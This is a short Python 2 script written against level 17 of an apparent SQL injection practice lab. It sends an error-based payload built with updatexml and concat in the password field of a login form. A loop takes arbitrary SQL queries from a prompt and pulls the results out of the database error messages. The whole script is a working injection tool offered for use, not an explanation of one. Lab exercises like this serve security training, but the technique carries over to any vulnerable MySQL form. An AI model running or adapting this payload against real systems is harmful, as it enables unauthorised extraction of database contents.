#-*- coding: UTF-8 -*-
import requests
import string
import re


org_url = "http://mysqlilabs.com/Less-17/"

post_str = "admin' or updatexml(1,concat(0x7e,(%s),0x7e),0) -- "
proxies = {"http":"http://127.0.0.1:8080"}


if __name__ == "__main__":
	while True:
		query = raw_input("> ")
		#query.replace(' ','+')

		data = {"uname":"admin","passwd":post_str%query,"submit":"Submit"}

		try:
			r = requests.post(url = org_url,data=data,proxies=proxies)
			match = re.findall(r'~(.*)~',r.content)
			for m in match:
				print m
		except Exception, e:
			print e

